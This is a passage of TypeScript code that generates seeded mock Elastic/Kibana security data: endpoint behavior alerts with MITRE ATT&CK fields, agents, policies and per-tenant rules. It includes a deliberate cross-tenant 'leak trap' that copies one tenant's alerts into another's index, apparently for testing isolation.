					metrics: ['CANARY_ACTIVITY'],
					entropy: Math.round(rng.float() * 300 + 400) / 100
				}))
			}
		};
	}

	// behavior
	const candidates = BEHAVIOR_RULES.filter((r) => r.os === os);
	const r = rng.pick(candidates.length ? candidates : BEHAVIOR_RULES);
	const sev: Sev = rng.weighted<Sev>([
		['medium', 2],
		['high', 3],
		['critical', 1],
		['low', 1]
	]);
	return {
		...endpointBase,
		message: prevented
			? `Malicious Behavior Prevention Alert: ${r.name}`
			: `Malicious Behavior Detection Alert: ${r.name}`,
		'kibana.alert.severity': sev,
		'kibana.alert.risk_score': SEVERITY_RISK[sev],
		'kibana.alert.original_event.code': 'behavior',
		'kibana.alert.original_event.action': prevented ? 'rule_prevention' : 'rule_detection',
		'kibana.alert.original_event.type': ['info'],
		event: {
			code: 'behavior',
			module: 'endpoint',
			kind: 'signal',
			action: prevented ? 'rule_prevention' : 'rule_detection',
			category: ['malware', 'intrusion_detection']
		},
		rule: { name: r.name, description: r.description, id: rng.uuid(), ruleset: 'production' },
		threat: [
			{
				framework: 'MITRE ATT&CK',
				tactic: { name: r.tactic },
				technique: [{ id: r.techniqueId, name: r.technique }]
			}
		],
		// Flattened sub-object form, as seen in some alert documents.
		'process.parent': {
			name: r.parent.name,
			executable: r.parent.executable,
			pid: rng.int(300, 9000),
			command_line: userDir(r.parent.cmd)
		},
		process: {
			name: r.process.name,
			executable: r.process.executable,
			pid: rng.int(1000, 15000),
			command_line: userDir(r.process.cmd),
			code_signature: {
				subject_name: os === 'windows' ? 'Microsoft Windows' : undefined,
				trusted: os === 'windows'
			},
			Ext: { user }
		}
	};
}

/**
 * The prebuilt Endpoint Security rule uses `rule_name_override: message`, so a
 * Defend alert's `kibana.alert.rule.name` is the Defend message. Also fill in
 * a Kibana-style `kibana.alert.reason` and assignees on triaged alerts.
 */
function promoteLikeKibana(src: RawAlertSource, rng: Rng) {
	const endpoint = src['kibana.alert.original_event.module'] === 'endpoint';
	if (endpoint && typeof src.message === 'string') src['kibana.alert.rule.name'] = src.message;
	const name = src['kibana.alert.rule.name'] as string;
	const host = (src.host as { name?: string } | undefined)?.name;
	const process = (src.process as { name?: string } | undefined)?.name;
	const file = (src.file as { name?: string } | undefined)?.name;
	const sev = src['kibana.alert.severity'];
	if (endpoint) {
		const parts = [
			'malware, intrusion_detection',
			process && `event with process ${process}`,
			file && `file ${file}`
		].filter(Boolean);
		src['kibana.alert.reason'] = `${parts.join(', ')}, on ${host} created ${sev} alert ${name}.`;
	}
	if (src['kibana.alert.workflow_status'] !== 'open' && rng.chance(0.7)) {
		src['kibana.alert.workflow_assignee_ids'] = [`u_${rng.hex(24)}_0`];
	}
}

function stripUndefined<T>(v: T): T {
	return JSON.parse(JSON.stringify(v)) as T;
}

export function buildMockWorld(now = Date.now(), seed = 20261024): MockWorld {
	const rng = new Rng(seed);
	const agents: RawFleetAgent[] = [];
	const endpointMetadata = new Map<string, RawEndpointMetadata>();
	const alertIndices = new Map<string, RawAlertHit[]>();
	const policies: RawAgentPolicy[] = [];
	const rules = new Map<string, MockRule[]>();

	for (const t of MOCK_TENANTS) {
		const index = `.internal.alerts-security.alerts-${t.spaceId}-000001`;
		const hits: RawAlertHit[] = [];
		for (const p of t.policies)
			policies.push({ id: p.id, name: p.name, namespace: t.namespace, revision: rng.int(3, 20) });
		// Each space has its own copy of every rule (own uuid, same prebuilt rule_id).
		const spaceRules: MockRule[] = [ENDPOINT_RULE, ...CUSTOM_RULES].map((r) => ({
			uuid: rng.uuid(),
			ruleId: 'ruleId' in r ? r.ruleId : rng.uuid(),
			name: r.name,
			description: r.description
		}));
		rules.set(t.spaceId, spaceRules);
		const ruleUuid = (name: string) => spaceRules.find((r) => r.name === name)!.uuid;
		const built = buildAgents(t, rng, now);
		for (const b of built) {
			agents.push(b.agent);
			if (b.meta) endpointMetadata.set(b.agent.id, b.meta);
		}
		// Alerts only come from agents that had Defend at some point.
		const sources = built.filter((b) => b.meta);
		for (let i = 0; i < t.alertCount; i++) {
			const host = sources[Math.floor(rng.float() ** 1.4 * sources.length)];
			const src = stripUndefined(buildAlert(t, host, rng, now, ruleUuid));
			hits.push({ _id: src['kibana.alert.uuid'] as string, _index: index, _source: src });
		}
		alertIndices.set(`.alerts-security.alerts-${t.spaceId}`, hits);
	}

	// Kibana-side fields the detection engine adds to every alert.
	for (const hits of alertIndices.values()) {
		for (const h of hits) promoteLikeKibana(h._source, rng);
	}

	// Leak trap: acme's space-wide Endpoint Security rule also matched globex endpoint alerts.
	const acme = alertIndices.get('.alerts-security.alerts-acme')!;
	for (const hit of alertIndices.get('.alerts-security.alerts-globex') ?? []) {
		if (hit._source['kibana.alert.original_event.module'] !== 'endpoint') continue;
		const copy = structuredClone(hit._source);
		copy['kibana.alert.uuid'] = rng.hex(64);
		copy['kibana.space_ids'] = ['acme'];
		acme.push({ _id: copy['kibana.alert.uuid'] as string, _index: acme[0]._index, _source: copy });
	}

	for (const hits of alertIndices.values()) {
		hits.sort((a, b) =>
			String(b._source['@timestamp']).localeCompare(String(a._source['@timestamp']))
		);
	}

	return { now, rules, agents, policies, endpointMetadata, alertIndices };
}
